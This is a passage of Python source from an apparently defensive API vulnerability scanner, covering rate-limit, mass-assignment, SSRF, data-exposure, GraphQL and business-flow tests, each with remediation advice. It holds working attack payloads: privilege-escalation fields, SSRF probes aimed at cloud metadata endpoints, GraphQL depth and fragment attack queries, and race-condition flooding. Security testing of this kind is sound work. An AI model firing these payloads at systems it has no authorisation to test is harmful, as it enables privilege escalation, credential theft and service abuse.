                    "Ensure unauthenticated traffic shares the same IP-based rate limit bucket."
                ),
                extra={"owasp": "API4:2023 Unrestricted Resource Consumption"},
            )

    # Per-endpoint rate limiting — test multiple different endpoints for missing rate limits
    con.status("rate_limiting", "running", "Per-endpoint rate limit coverage")
    sensitive_endpoints = [ep for ep in inventory
                           if any(kw in ep["path"].lower()
                                  for kw in ("password", "reset", "register", "signup",
                                             "email", "verify", "otp", "2fa", "mfa"))]
    for ep in sensitive_endpoints[:5]:
        if _shutdown_requested:
            break
        ep_url = root + re.sub(r'\{[^}]+\}|:\w+', '1', ep["path"])
        ep_statuses: list = []
        for _ in range(20):
            resp = _safe_get(sess, ep_url, timeout=timeout)
            if resp:
                ep_statuses.append(resp.status_code)
                if resp.status_code == 429:
                    break
        if ep_statuses and 429 not in ep_statuses:
            output.add_finding(
                phase="rate_limiting",
                title=f"Missing Rate Limit on Sensitive Endpoint: {ep['path']}",
                severity="HIGH",
                url=ep_url,
                detail=(
                    f"Sensitive endpoint {ep['method']} {ep['path']} accepted 20 rapid "
                    f"requests without rate limiting. This endpoint may be vulnerable to "
                    f"automated abuse (password reset flooding, OTP brute-force, etc.)."
                ),
                evidence=f"20 requests → status codes: {ep_statuses[:10]}",
                remediation=(
                    "Apply strict per-IP and per-user rate limits on all sensitive endpoints "
                    "(password reset, OTP, registration, email verification)."
                ),
                extra={"owasp": "API4:2023 Unrestricted Resource Consumption"},
            )
            con.log(f"[rate_limiting] No rate limit on sensitive: {ep_url}", "SUCCESS")

    con.status("rate_limiting", "done", "Rate limiting tests complete")


# ---------------------------------------------------------------------------
# Phase 6: Mass Assignment
# ---------------------------------------------------------------------------

_MASS_ASSIGN_PAYLOADS = [
    {"is_admin": True},
    {"role": "admin"},
    {"is_vip": True},
    {"premium": True},
    {"account_balance": 99999},
    {"credit": 1000},
    {"__admin__": True},
    {"permissions": ["admin", "superuser"]},
    {"admin": True},
    {"is_staff": True},
    {"superuser": True},
    {"verified": True},
    {"email_verified": True},
    {"price": 0},
    {"discount": 100},
]


def phase_mass_assignment(settings: dict, sess: requests.Session,
                          auth_sess, output: OutputManager,
                          inventory: list) -> None:
    """Phase 6: Mass assignment / over-posting attack testing."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"
    extra_fields = scan.get("mass_assignment_fields", [])

    con.status("mass_assignment", "running", "Testing mass assignment")

    active_sess = auth_sess or sess
    write_methods = ("POST", "PUT", "PATCH")
    write_endpoints = [ep for ep in inventory if ep["method"] in write_methods]

    if not write_endpoints:
        con.status("mass_assignment", "skip", "No writable endpoints in inventory")
        return

    # Build combined mass-assign payload
    combined_payload = {}
    for p in _MASS_ASSIGN_PAYLOADS:
        combined_payload.update(p)
    for field in extra_fields:
        combined_payload[field] = True

    for ep in write_endpoints[:10]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        body_fields = ep.get("body_fields", [])

        # Build normal body (empty / default values)
        normal_body = {f: "" for f in body_fields}

        # Normal request baseline
        baseline = _safe_request(active_sess, method, url,
                                  json=normal_body, timeout=timeout)

        # Mass assignment attempt: add extra fields
        attack_body = {**normal_body, **combined_payload}
        attack_resp = _safe_request(active_sess, method, url,
                                     json=attack_body, timeout=timeout)

        if attack_resp and attack_resp.status_code in (200, 201):
            try:
                attack_data = attack_resp.json()
                attack_keys = set(_extract_json_keys(attack_data))
                # Check if any extra fields appear in response
                privileged_keys = {
                    "is_admin", "admin", "role", "is_vip", "premium",
                    "permissions", "is_staff", "superuser",
                }
                leaked = attack_keys & privileged_keys
                if leaked:
                    output.add_finding(
                        phase="mass_assignment",
                        title="Mass Assignment / Privilege Escalation via Parameter Binding",
                        severity="HIGH",
                        url=url,
                        detail="The application or API auto-binds request input properties to internal model objects without restricting which fields may be set, allowing an attacker to inject privileged fields (e.g., role, isAdmin) and escalate privileges.",
                        evidence=f"Response keys: {list(leaked)}",
                        remediation="Define and enforce an explicit allowlist of bindable properties using DTOs or input validation schemas; reject or ignore any request field not explicitly permitted for the given operation.",
                    )
                elif (baseline and
                      attack_resp.text != baseline.text and
                      len(attack_resp.text) > len(normal_body.__str__())):
                    output.add_finding(
                        phase="mass_assignment",
                        title="Possible Mass Assignment — Response Differs",
                        severity="MEDIUM",
                        url=url,
                        detail=(f"Response to mass-assignment payload differs from baseline "
                                f"on {method} {ep['path']}."),
                        evidence=f"Baseline size: {len(baseline.text) if baseline else 0}, Attack size: {len(attack_resp.text)}",
                        remediation="Review endpoint for unintended field binding.",
                    )
            except Exception:
                pass

    # Extended mass assignment: nested objects, arrays, type confusion, case bypass
    _NESTED_PAYLOADS = [
        {"user": {"role": "admin", "is_admin": True, "is_staff": True}},
        {"profile": {"permissions": ["admin", "superuser"], "premium": True}},
        {"account": {"balance": 99999, "credit": 1000, "is_vip": True}},
    ]
    _TYPE_CONFUSION = [
        {"role": 1},
        {"admin": 1},
        {"is_admin": "1"},
        {"permissions": "admin"},
        {"account_balance": "99999"},
    ]
    _CASE_BYPASS = [
        {"ROLE": "admin"},
        {"Role": "admin"},
        {"is_Admin": True},
        {"isAdmin": True},
        {"IS_ADMIN": True},
        {"PERMISSIONS": ["admin"]},
    ]

    for ep in inventory[:15]:
        if _shutdown_requested:
            break
        if ep["method"].upper() not in ("POST", "PUT", "PATCH"):
            continue
        path       = ep["path"]
        probe_path = re.sub(r'\{[^}]+\}|:\w+', '1', path)
        url        = root + probe_path
        method     = ep["method"].upper()
        body_fields = ep.get("body_fields", [])
        normal_body = {f: "" for f in body_fields if isinstance(f, str)}

        for extra_payloads, attack_label in [
            (_NESTED_PAYLOADS,  "nested object"),
            (_TYPE_CONFUSION,   "type confusion"),
            (_CASE_BYPASS,      "case bypass"),
        ]:
            for extra in extra_payloads:
                attack_body = {**normal_body, **extra}
                try:
                    ar = active_sess.request(method, url, json=attack_body, timeout=timeout)
                    if ar and ar.status_code in (200, 201):
                        try:
                            resp_data = ar.json()
                            resp_str  = json.dumps(resp_data).lower()
                            # Check if any privileged field appears reflected
                            priv_keys = {"is_admin", "admin", "role", "is_vip", "premium",
                                         "is_staff", "superuser", "permissions", "balance"}
                            flat_keys = set(k.lower() for k in _extract_json_keys(resp_data))
                            if priv_keys & flat_keys:
                                output.add_finding(
                                    phase="mass_assignment",
                                    title=f"Mass Assignment — {attack_label.title()} Accepted",
                                    severity="HIGH",
                                    url=url,
                                    detail=(
                                        f"Endpoint {method} {path} accepted a {attack_label} "
                                        f"mass-assignment payload and reflected privileged fields "
                                        f"in the response."
                                    ),
                                    evidence=(
                                        f"Payload: {json.dumps(extra)}\n"
                                        f"Reflected keys: {list(priv_keys & flat_keys)}"
                                    ),
                                    remediation=(
                                        "Use strict allowlist-based field binding. "
                                        "Reject unknown fields including nested objects, "
                                        "type-coerced values, and case variants."
                                    ),
                                    extra={"owasp": "API3:2023 Broken Object Property Level Authorization"},
                                )
                                con.log(f"[mass_assignment] {attack_label}: {url}", "SUCCESS")
                        except Exception:
                            pass
                except Exception:
                    pass

    con.status("mass_assignment", "done", "Mass assignment testing complete")


# ---------------------------------------------------------------------------
# Phase 7: SSRF
# ---------------------------------------------------------------------------

_SSRF_PARAM_NAMES = re.compile(
    r'(url|uri|endpoint|callback|redirect|webhook|src|source|'
    r'dest|destination|next|target|host|domain|feed|link|'
    r'file|image|path|load|fetch|resource|location|site)',
    re.IGNORECASE
)

_SSRF_PAYLOADS = [
    "http://127.0.0.1:80/",
    "http://127.0.0.1:22/",
    "http://localhost:8080/admin",
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://[::1]/",
    "http://0.0.0.0/",
    "http://metadata.google.internal/",
]


def phase_ssrf(settings: dict, sess: requests.Session,
               auth_sess, output: OutputManager, inventory: list) -> None:
    """Phase 7: SSRF via API URL parameters."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("ssrf", "running", "Testing SSRF in URL parameters")

    active_sess = auth_sess or sess

    ssrf_tested = 0
    for ep in inventory[:30]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        method = ep["method"]
        params = ep.get("params", [])
        body_fields = ep.get("body_fields", [])
        all_params = [p["name"] for p in params] + body_fields

        # Find URL-like parameters
        url_params = [p for p in all_params if _SSRF_PARAM_NAMES.search(p)]

        # Also probe path for URL-like parameter names embedded in path
        path_parts = ep["path"].split("/")
        for part in path_parts:
            if _SSRF_PARAM_NAMES.search(part) and part not in url_params:
                url_params.append(part)

        if not url_params:
            continue

        for param in url_params[:2]:
            for payload in _SSRF_PAYLOADS[:4]:
                ssrf_tested += 1
                try:
                    if method in ("GET", "HEAD"):
                        test_url = f"{url}?{quote(param)}={quote(payload)}"
                        resp = active_sess.get(test_url, timeout=timeout)
                    else:
                        body = {param: payload}
                        resp = active_sess.request(method, url, json=body, timeout=timeout)

                    if resp:
                        if _SSRF_INTERNAL_RE.search(resp.text):
                            sev = "CRITICAL" if "meta-data" in payload else "HIGH"
                            output.add_finding(
                                phase="ssrf",
                                title="SSRF via API Parameter",
                                severity=sev,
                                url=url,
                                detail=(f"SSRF payload in parameter '{param}' triggered "
                                        f"internal content in response. Payload: {payload}"),
                                evidence=f"Response contained internal indicators: {resp.text[:300]}",
                                remediation=(
                                    "Validate and allowlist URLs; "
                                    "block internal IP ranges; use SSRF-safe HTTP clients."
                                ),
                            )
                            break
                        elif resp.status_code in (200, 201) and resp.elapsed.total_seconds() > 3:
                            output.add_finding(
                                phase="ssrf",
                                title="Possible SSRF — Delayed Response",
                                severity="MEDIUM",
                                url=url,
                                detail=(f"Parameter '{param}' with SSRF payload caused "
                                        f"{resp.elapsed.total_seconds():.1f}s delay."),
                                evidence=f"Payload: {payload}, delay: {resp.elapsed.total_seconds():.1f}s",
                                remediation="Validate URL parameters against an allowlist.",
                            )
                except Exception:
                    pass

    if ssrf_tested == 0:
        con.info("No URL-accepting parameters found for SSRF testing")

    con.status("ssrf", "done", f"SSRF tested on {ssrf_tested} parameter/payload combinations")


# ---------------------------------------------------------------------------
# Phase 8: Data Exposure
# ---------------------------------------------------------------------------

_SENSITIVE_FIELD_RE = re.compile(
    r'\b(password|passwd|secret|token|api_key|apikey|ssn|social_security|'
    r'credit_card|cc_number|card_number|cvv|private_key|private|'
    r'access_token|refresh_token|client_secret|aws_secret|'
    r'auth_token|session_token)\b',
    re.IGNORECASE
)


def phase_data_exposure(settings: dict, sess: requests.Session,
                        auth_sess, output: OutputManager, inventory: list) -> None:
    """Phase 8: Excessive data exposure in API responses."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("data_exposure", "running", "Checking API responses for sensitive data")

    active_sess = auth_sess or sess
    get_endpoints = [ep for ep in inventory if ep["method"] == "GET"]

    for ep in get_endpoints[:20]:
        if _shutdown_requested:
            break
        url = root + ep["path"]
        resp = _safe_get(active_sess, url, timeout=timeout)
        if not resp or resp.status_code != 200:
            continue

        # Try to parse JSON response
        try:
            data = resp.json()
        except Exception:
            # Check raw text for sensitive patterns
            matches = _SENSITIVE_FIELD_RE.findall(resp.text)
            if matches:
                unique_matches = list(set(m.lower() for m in matches))
                output.add_finding(
                    phase="data_exposure",
                    title="Sensitive Data Exposed in API Response",
                    severity="HIGH",
                    url=url,
                    detail=(f"Response body contains potentially sensitive field names: "
                            f"{', '.join(unique_matches)}"),
                    evidence=f"Fields found: {unique_matches}; response snippet: {resp.text[:200]}",
                    remediation="Filter sensitive fields from API responses; apply response masks.",
                )
            continue

        # Check response keys recursively
        all_keys = _extract_json_keys(data)
        sensitive_found = [k for k in all_keys if _SENSITIVE_FIELD_RE.search(k.split(".")[-1])]

        if sensitive_found:
            # Check actual values too — if non-empty, more serious
            has_values = False
            if isinstance(data, dict):
                for sf in sensitive_found[:3]:
                    top_key = sf.split(".")[0]
                    val = data.get(top_key)
                    if val and isinstance(val, str) and len(val) > 3:
                        has_values = True
                        break
            elif isinstance(data, list) and data:
                first = data[0] if isinstance(data[0], dict) else {}
                for sf in sensitive_found[:3]:
                    top_key = sf.split(".")[0]
                    val = first.get(top_key)
                    if val and isinstance(val, str) and len(val) > 3:
                        has_values = True
                        break

            severity = "HIGH" if has_values else "MEDIUM"
            output.add_finding(
                phase="data_exposure",
                title="Excessive Data Exposure — Sensitive Fields in API Response",
                severity=severity,
                url=url,
                detail=(f"API response contains sensitive field names: "
                        f"{', '.join(sensitive_found[:10])}"),
                evidence=f"Sensitive keys: {sensitive_found[:5]}",
                remediation=(
                    "Apply field-level filtering; use response DTOs; "
                    "never expose internal model fields in API responses."
                ),
            )

        # Check for excessive fields (more than documented)
        documented_fields = set(p["name"] for p in ep.get("params", []))
        documented_fields |= set(ep.get("body_fields", []))
        if documented_fields and len(all_keys) > len(documented_fields) * 3:
            output.add_finding(
                phase="data_exposure",
                title="API Returns More Fields Than Documented",
                severity="LOW",
                url=url,
                detail=(f"Response contains {len(all_keys)} fields; "
                        f"spec documents ~{len(documented_fields)} parameters."),
                evidence=f"Extra keys sample: {all_keys[:5]}",
                remediation="Use response schemas to limit which fields are returned.",
            )

    con.status("data_exposure", "done", "Data exposure analysis complete")


# ---------------------------------------------------------------------------
# Phase 9: GraphQL
# ---------------------------------------------------------------------------

_GRAPHQL_PATHS = [
    "/graphql",
    "/api/graphql",
    "/v1/graphql",
    "/v2/graphql",
    "/graphiql",
    "/api/graphiql",
    "/graph",
    "/query",
]

_INTROSPECTION_QUERY = {
    "query": (
        "{ __schema { types { name fields { name type { name kind } } } } }"
    )
}

_DEPTH_ATTACK_QUERY = {
    "query": (
        "{ a { a { a { a { a { a { a { a { a { a { __typename } } } } } } } } } } }"
    )
}


def phase_graphql(settings: dict, sess: requests.Session,
                  auth_sess, output: OutputManager) -> None:
    """Phase 9: GraphQL introspection and query depth attacks."""
    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("graphql", "running", "Probing for GraphQL endpoints")

    active_sess = auth_sess or sess
    gql_found = None

    for gql_path in _GRAPHQL_PATHS:
        url = root + gql_path
        # Simple probe
        resp = _safe_request(active_sess, "POST", url,
                             json={"query": "{ __typename }"},
                             timeout=timeout)
        if resp and resp.status_code in (200, 400):
            try:
                data = resp.json()
                if "data" in data or "errors" in data:
                    gql_found = url
                    con.info(f"GraphQL endpoint found: {url}")
                    break
            except Exception:
                pass

    if not gql_found:
        con.status("graphql", "skip", "No GraphQL endpoint found")
        return

    # Introspection
    resp = _safe_request(active_sess, "POST", gql_found,
                         json=_INTROSPECTION_QUERY, timeout=timeout)
    if resp:
        try:
            data = resp.json()
            if "data" in data and "__schema" in data.get("data", {}):
                schema_data = data["data"]["__schema"]
                types = schema_data.get("types", [])
                type_names = [t["name"] for t in types if not t["name"].startswith("__")]
                output.add_finding(
                    phase="graphql",
                    title="GraphQL Introspection Enabled",
                    severity="LOW",
                    url=gql_found,
                    detail=(f"GraphQL introspection is enabled, exposing full schema. "
                            f"Found {len(type_names)} types."),
                    evidence=f"Types: {type_names[:10]}",
                    remediation=(
                        "Disable introspection in production GraphQL endpoints. "
                        "Restrict to authenticated developers only."
                    ),
                )
        except Exception:
            pass

    # Query depth attack
    resp = _safe_request(active_sess, "POST", gql_found,
                         json=_DEPTH_ATTACK_QUERY, timeout=timeout)
    if resp and resp.status_code == 200:
        try:
            data = resp.json()
            if "errors" not in data:
                output.add_finding(
                    phase="graphql",
                    title="GraphQL Query Depth Attack",
                    severity="MEDIUM",
                    url=gql_found,
                    detail="GraphQL endpoint accepted a 10-level deep nested query without error.",
                    evidence=f"Depth-10 query returned HTTP 200 without depth errors",
                    remediation="Implement query depth limiting (max 3-5 levels) in the GraphQL server.",
                )
        except Exception:
            pass

    # Directive abuse — @include / @skip infinite loop
    directive_query = {"query": "{ __typename @include(if: true) @skip(if: false) @include(if: true) }"}
    resp = _safe_request(active_sess, "POST", gql_found,
                         json=directive_query, timeout=timeout)
    if resp and resp.status_code == 200:
        try:
            data = resp.json()
            if "errors" not in data:
                output.add_finding(
                    phase="graphql",
                    title="GraphQL Directive Abuse — Accepted Without Limit",
                    severity="LOW",
                    url=gql_found,
                    detail=(
                        "GraphQL endpoint accepted a query with multiple conflicting "
                        "@include and @skip directives on the same field. "
                        "Without directive-count limits, this can be used to trigger "
                        "excessive query planning overhead."
                    ),
                    evidence="Directive-stacked query → HTTP 200 without error",
                    remediation=(
                        "Implement directive count limits per field. "
                        "Reject queries with conflicting @include/@skip pairs."
                    ),
                    extra={"owasp": "API4:2023 Unrestricted Resource Consumption"},
                )
        except Exception:
            pass

    # Fragment sprawl — many fragments pointing to same type
    fragment_q = (
        "fragment f1 on __Schema { types { name } } "
        "fragment f2 on __Schema { types { name } } "
        "fragment f3 on __Schema { types { name } } "
        "{ __schema { ...f1 ...f2 ...f3 } }"
    )
    resp = _safe_request(active_sess, "POST", gql_found,
                         json={"query": fragment_q}, timeout=timeout)
    if resp and resp.status_code == 200:
        try:
            data = resp.json()
            if "data" in data and not data.get("errors"):
                output.add_finding(
                    phase="graphql",
                    title="GraphQL Fragment Sprawl — No Fragment Count Limit",
                    severity="MEDIUM",
                    url=gql_found,
                    detail=(
                        "GraphQL endpoint accepted a query with 3 fragments on the same "
                        "type without restriction. Attackers can use hundreds of fragments "
                        "to force O(n²) resolver execution (fragment amplification attack)."
                    ),
                    evidence="3-fragment sprawl query → HTTP 200 with data",
                    remediation=(
                        "Limit the number of fragments per query (e.g. max 10). "
                        "Implement query complexity scoring that accounts for fragment expansion."
                    ),
                    extra={"owasp": "API4:2023 Unrestricted Resource Consumption"},
                )
        except Exception:
            pass

    # Error message leakage — probe for verbose server errors in response
    bad_query = {"query": "{ nonExistentField123_fracture_siphon }"}
    resp = _safe_request(active_sess, "POST", gql_found,
                         json=bad_query, timeout=timeout)
    if resp and resp.status_code in (200, 400):
        try:
            data = resp.json()
            errors = data.get("errors", [])
            if errors:
                err_text = json.dumps(errors)
                # Check for stack traces or detailed internal paths
                if re.search(r'at [A-Z][\w]+\.|File ".*\.py"|Traceback|stack.?trace|'
                             r'StackTrace|java\.|NullPointer', err_text, re.I):
                    output.add_finding(
                        phase="graphql",
                        title="GraphQL Error Response Leaks Internal Details",
                        severity="MEDIUM",
                        url=gql_found,
                        detail=(
                            "GraphQL error response for an invalid field query contains "
                            "internal implementation details (stack traces, file paths, "
                            "or class names). This assists attackers in mapping the server."
                        ),
                        evidence=f"Error response: {err_text[:500]}",
                        remediation=(
                            "Configure the GraphQL server to return generic error messages "
                            "in production. Log full errors server-side only."
                        ),
                        extra={"owasp": "API7:2023 Server Side Request Forgery"},
                    )
        except Exception:
            pass

    # Subscription endpoint probe (DoS potential)
    sub_paths = ["/graphql", "/subscriptions", "/ws", "/graphql/subscriptions"]
    for sub_path in sub_paths:
        sub_url = root + sub_path
        try:
            r = active_sess.get(sub_url, timeout=5,
                                headers={"Upgrade": "websocket",
                                         "Connection": "Upgrade",
                                         "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                                         "Sec-WebSocket-Version": "13"})
            if r and r.status_code in (101, 200, 400):
                output.add_finding(
                    phase="graphql",
                    title="GraphQL Subscription Endpoint Detected",
                    severity="INFO",
                    url=sub_url,
                    detail=(
                        f"A WebSocket/subscription endpoint at {sub_path} responded "
                        f"to an upgrade request (HTTP {r.status_code}). "
                        f"Without subscription limits, clients can open unlimited "
                        f"subscriptions consuming server resources."
                    ),
                    evidence=f"GET {sub_url} with WebSocket upgrade → HTTP {r.status_code}",
                    remediation=(
                        "Limit the number of concurrent subscriptions per client. "
                        "Authenticate subscription connections. "
                        "Apply rate limiting to subscription creation."
                    ),
                    extra={"owasp": "API4:2023 Unrestricted Resource Consumption"},
                )
                con.log(f"[graphql] Subscription endpoint: {sub_url}", "INFO")
                break
        except Exception:
            pass

    con.status("graphql", "done", f"GraphQL testing complete at {gql_found}")


# ---------------------------------------------------------------------------
# Phase 9b: Business Flows (OWASP API6:2023)
# ---------------------------------------------------------------------------

_BF_WORKFLOW_RE = re.compile(
    r'checkout|confirm|payment|pay|order|purchase|cart|complete|'
    r'transfer|send|submit|process|finalize|approve|step\d|coupon|promo', re.I
)
_BF_NUMERIC_FIELDS_RE = re.compile(
    r'qty|quantity|amount|price|cost|total|count|num|value|'
    r'discount|fee|rate|balance|credit|units|items', re.I
)


def phase_business_flows(settings: dict, sess: requests.Session,
                         auth_sess, output: OutputManager,
                         inventory: list) -> None:
    """Phase 9b: Business flow abuse — OWASP API6:2023."""
    scan     = settings["scan"]
    base_url = scan["api_base_url"]
    timeout  = scan.get("timeout", 10)
    threads  = min(scan.get("threads", 10), 10)
    target   = _parse_target(base_url)
    root     = f"{target['scheme']}://{target['netloc']}"

    con.status("business_flows", "running", "Identifying workflow endpoints")

    # Classify endpoints into workflow (order/payment/submit), numeric-field, and all
    workflow_eps = [ep for ep in inventory
                    if _BF_WORKFLOW_RE.search(ep.get("path", "") +
                                               " ".join(ep.get("body_fields", [])))]
    numeric_eps  = [ep for ep in inventory
                    if any(_BF_NUMERIC_FIELDS_RE.search(f if isinstance(f, str) else f.get("name", ""))
                           for f in ep.get("body_fields", []) + ep.get("params", [])
                           if isinstance(f, (str, dict)))]

    # ── 1. Workflow step skipping ────────────────────────────────────────────
    con.status("business_flows", "running", "Workflow skip detection")
    skip_sess = requests.Session()
    skip_sess.headers["User-Agent"] = scan.get("user_agent", "Siphon/1.0")
    skip_sess.verify = False

    for ep in workflow_eps[:20]:
        if _shutdown_requested:
            break
        if ep["method"].upper() not in ("GET", "HEAD"):
            continue
        path = ep["path"]
        # Replace path params with integer placeholders for probing
        probe_path = re.sub(r'\{[^}]+\}|:\w+', '1', path)
        url = root + probe_path
        try:
            r = skip_sess.get(url, timeout=timeout, allow_redirects=False)
            if r and r.status_code in (200, 201):
                output.add_finding(
                    phase="business_flows",
                    title="Business Flow — Workflow Step Directly Accessible",
                    severity="HIGH",
                    url=url,
                    detail=(
                        f"Workflow endpoint '{path}' returned HTTP {r.status_code} "
                        f"when accessed directly with no session. This may allow "
                        f"skipping payment, verification, or approval steps."
                    ),
                    evidence=f"GET {url} → HTTP {r.status_code} (unauthenticated)",
                    remediation=(
                        "Enforce server-side workflow state machine. Validate that all "
                        "prerequisite steps are complete before accepting late-stage requests."
                    ),
                    extra={"owasp": "API6:2023 Unrestricted Access to Sensitive Business Flows",
                           "nist": "AC-3"},
                )
                con.log(f"[business_flows] Workflow skip: {url}", "SUCCESS")
        except Exception:
            pass

    # ── 2. Race condition — concurrent duplicate submission ──────────────────
    con.status("business_flows", "running", "Race condition testing")
    for ep in workflow_eps[:5]:
        if _shutdown_requested:
            break
        method = ep["method"].upper()
        if method not in ("POST", "PUT", "PATCH"):
            continue
        path       = ep["path"]
        probe_path = re.sub(r'\{[^}]+\}|:\w+', '1', path)
        url        = root + probe_path
        test_sess  = auth_sess if auth_sess else sess
        body_fields = ep.get("body_fields", [])
        payload     = {f: "test" for f in body_fields if isinstance(f, str)}

        results: list = []

        def _race(idx, _url=url, _method=method, _payload=payload, _sess=test_sess):
            try:
                fn = getattr(_sess, _method.lower(), None)
                if fn:
                    r = fn(_url, json=_payload, timeout=timeout)
                    results.append(r.status_code)
            except Exception:
                pass

        with ThreadPoolExecutor(max_workers=threads) as pool:
            list(pool.map(_race, range(threads)))

        successes = [s for s in results if s in (200, 201)]
        if len(successes) > 1:
            output.add_finding(
                phase="business_flows",
                title="Business Flow — Race Condition (Duplicate Operation)",
                severity="HIGH",
                url=url,
                detail=(
                    f"Sending {len(results)} concurrent {method} requests to {url} "
                    f"yielded {len(successes)} successful responses. This may allow "
                    f"duplicate operations: double-spend, coupon reuse, duplicate orders."
                ),
                evidence=(
                    f"Concurrent requests: {len(results)}\n"
                    f"Successful: {len(successes)}"
                ),
                remediation=(
                    "Use idempotency keys on all transaction-forming endpoints. "
                    "Apply atomic check-and-set operations or database-level locks. "
                    "Track per-session request deduplication with short TTL."
                ),
                extra={"owasp": "API6:2023 Unrestricted Access to Sensitive Business Flows",
                       "nist": "SC-5"},
            )
            con.log(f"[business_flows] Race condition: {url} ({len(successes)}/{len(results)})", "SUCCESS")

    # ── 3. Negative / zero value injection ──────────────────────────────────
    con.status("business_flows", "running", "Negative value injection")
    ep_sess = auth_sess if auth_sess else sess
    for ep in inventory[:40]:
        if _shutdown_requested:
            break
        method = ep["method"].upper()
        if method not in ("POST", "PUT", "PATCH"):
            continue
        bf = ep.get("body_fields", [])
        num_fields = [f for f in bf
                      if isinstance(f, str) and _BF_NUMERIC_FIELDS_RE.search(f)]
        if not num_fields:
            continue
        path       = ep["path"]
        probe_path = re.sub(r'\{[^}]+\}|:\w+', '1', path)
        url        = root + probe_path
        for test_val, label in [("-1", "negative"), ("0", "zero")]:
            payload = {f: "test" for f in bf if isinstance(f, str)}
            for nf in num_fields:
                payload[nf] = test_val
            try:
                fn = getattr(ep_sess, method.lower(), None)
                if not fn:
                    continue
                r = fn(url, json=payload, timeout=timeout)
                if r and r.status_code in (200, 201) and not re.search(
                        r'error|invalid|rejected|negative|below.zero', r.text, re.I):
                    output.add_finding(
                        phase="business_flows",
                        title="Business Flow — Numeric Field Accepts Negative/Zero Value",
                        severity="HIGH",
                        url=url,
                        detail=(
                            f"API endpoint {method} {path} accepted a {label} value "
                            f"({test_val}) for field(s): {', '.join(num_fields)}. "
                            f"This may allow financial manipulation or quantity bypass."
                        ),
                        evidence=(
                            f"Payload: {payload}\nHTTP {r.status_code}"
                        ),
                        remediation=(
                            "Validate all numeric inputs server-side. Reject zero, negative, "
                            "and implausibly large values. Use server-authoritative pricing."
                        ),
                        extra={"owasp": "API6:2023 Unrestricted Access to Sensitive Business Flows",
                               "nist": "AC-3"},
                    )
                    con.log(f"[business_flows] Neg value: {url} field={num_fields[0]}", "SUCCESS")
                    break
            except Exception:
                pass

    # ── 4. Bulk / mass-operation abuse (excessive automation) ────────────────
    con.status("business_flows", "running", "Bulk operation detection")
    bulk_eps = [ep for ep in inventory
                if any(k in ep.get("path", "").lower() for k in
                       ("bulk", "batch", "mass", "multi", "all", "export", "import"))]
    for ep in bulk_eps[:10]:
        if _shutdown_requested:
            break
        path       = ep["path"]
        probe_path = re.sub(r'\{[^}]+\}|:\w+', '1', path)
        url        = root + probe_path
        method     = ep["method"].upper()
        ep_sess2   = auth_sess if auth_sess else sess
        # Try a large batch payload
        large_payload = [{"id": str(i)} for i in range(1, 201)]
        try:
            r = ep_sess2.request(method, url, json=large_payload, timeout=timeout)
            if r and r.status_code in (200, 201):
                output.add_finding(
                    phase="business_flows",
                    title="Business Flow — Bulk Endpoint Accepts Unrestricted Batch Size",
                    severity="MEDIUM",
                    url=url,
                    detail=(
                        f"Bulk endpoint {method} {path} accepted a 200-item payload "
                        f"without restriction (HTTP {r.status_code}). Missing batch size "
                        f"limits enable mass-operation abuse."
                    ),
                    evidence=f"Batch size: 200 items → HTTP {r.status_code}",
                    remediation=(
                        "Enforce maximum batch sizes on bulk endpoints. Implement "
                        "per-request and per-session rate limits for bulk operations."
                    ),
                    extra={"owasp": "API6:2023 Unrestricted Access to Sensitive Business Flows",
                           "nist": "SC-5"},
                )
                con.log(f"[business_flows] Bulk abuse: {url}", "SUCCESS")
        except Exception:
            pass

    con.status("business_flows", "done", "Business flow testing complete")


# ---------------------------------------------------------------------------
# Phase 10: BOLA/IDOR
# ---------------------------------------------------------------------------

_ID_PARAM_RE = re.compile(r'\{([^}]+)\}|:([a-zA-Z_][a-zA-Z0-9_]*)$|/(\d+)$')


def _extract_path_ids(path: str) -> list:
    """Extract path parameter names and numeric IDs from a path template."""
    ids = []
    # OAS-style {param}
    for m in re.finditer(r'\{([^}]+)\}', path):
        ids.append(m.group(1))
    # Express-style :param
    for m in re.finditer(r':([a-zA-Z_][a-zA-Z0-9_]*)', path):
        ids.append(m.group(1))
    # Literal numeric IDs
    for m in re.finditer(r'/(\d+)(?:/|$)', path):
        ids.append(m.group(1))
    return ids


def phase_bola(settings: dict, auth_sess, output: OutputManager,
               inventory: list) -> None:
    """Phase 10: BOLA/IDOR — cross-user object access."""
    if auth_sess is None:
        con.status("bola", "skip", "Auth session required")
        return

    scan = settings["scan"]
    base_url = scan["api_base_url"]
    timeout = scan.get("timeout", 10)
    target = _parse_target(base_url)
    root = f"{target['scheme']}://{target['netloc']}"

    con.status("bola", "running", "Testing BOLA/IDOR vulnerabilities")

    # Find endpoints with ID parameters
    id_endpoints = []
    for ep in inventory:
        if ep["method"] == "GET":
            ids = _extract_path_ids(ep["path"])
            if ids:
                id_endpoints.append((ep, ids))

    if not id_endpoints:
        # Probe /me or /profile to get own ID
        me_urls = ["/me", "/user/me", "/api/me", "/users/me", "/profile",
                   "/account", "/api/account"]
        for me_path in me_urls:
            url = root + me_path
            resp = _safe_get(auth_sess, url, timeout=timeout)
            if resp and resp.status_code == 200:
                try:
                    data = resp.json()
                    own_id = (data.get("id") or data.get("user_id") or
                              data.get("userId") or data.get("_id"))
                    if own_id:
                        con.info(f"Own user ID: {own_id}")
                        # Try adjacent IDs
                        for delta in (1, -1, 2, 100):
                            test_id = int(own_id) + delta if str(own_id).isdigit() else own_id
                            test_url = root + f"/users/{test_id}"
                            test_resp = _safe_get(auth_sess, test_url, timeout=timeout)
                            if test_resp and test_resp.status_code == 200:
                                try:
                                    test_data = test_resp.json()
                                    resp_id = (test_data.get("id") or test_data.get("user_id") or
